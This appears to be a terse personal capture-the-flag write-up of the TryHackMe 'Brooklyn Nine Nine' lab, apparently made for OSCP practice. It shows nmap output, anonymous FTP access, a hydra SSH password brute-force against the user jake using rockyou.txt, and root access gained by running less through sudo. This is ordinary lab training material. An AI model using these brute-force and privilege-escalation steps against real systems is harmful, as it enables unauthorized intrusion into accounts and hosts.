kali@kali:~/oscptraining/tryhackme/brooklyn99$ nmap -sV -sC -o nmap 10.10.216.12
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-10 05:28 EST
Nmap scan report for 10.10.216.12
Host is up (0.32s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.102.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


trying gobuster
kali@kali:~/oscptraining/tryhackme/brooklyn99$ gobuster dir -e -u 10.10.216.12 -x php,txt,cgi,css,py,html -w /usr/share/dirb/wordlists/common.txt

seems like there's nothing much


FTP allows anonymous login, let's try logging in 

kali@kali:~/oscptraining/tryhackme/brooklyn99$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

seems like there's some weak password to some place. 

kali@kali:~/oscptraining/tryhackme/brooklyn99$ hydra 10.10.216.12 ssh -l jake -P /usr/share/wordlists/rockyou.txt

went to get the user.txt

jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less


sudo /usr/bin/less /root/root.txt 

and we get our root.txt!






